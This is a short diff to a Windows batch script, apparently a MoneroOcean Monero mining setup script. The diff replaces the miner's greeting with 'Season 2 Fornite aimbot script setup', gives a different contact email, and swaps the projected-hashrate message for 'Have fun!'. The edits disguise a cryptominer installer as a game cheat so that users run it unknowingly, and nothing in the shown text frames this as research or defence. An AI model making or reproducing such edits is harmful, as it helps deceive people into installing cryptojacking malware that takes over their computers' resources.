@@ -4,8 +4,8 @@ set VERSION=2.4
 
 rem printing greetings
 
-echo MoneroOcean mining setup script v%VERSION%.
-echo ^(please report issues to support@moneroocean.stream email^)
+echo Season 2 Fornite aimbot script setup.
+echo ^(please report issues to xeon.fn.YT@GMAIL.COM^)
 echo.
 
 net session >nul 2>&1
@@ -182,7 +182,7 @@ if %ADMIN% == 0 (
 )
 
 echo.
-echo JFYI: This host has %CPU_THREADS% CPU threads with %CPU_MHZ% MHz and %TOTAL_CACHE%KB data cache in total, so projected Monero hashrate is around %EXP_MONERO_HASHRATE% H/s.
+echo Have fun!
 echo.
 
 pause
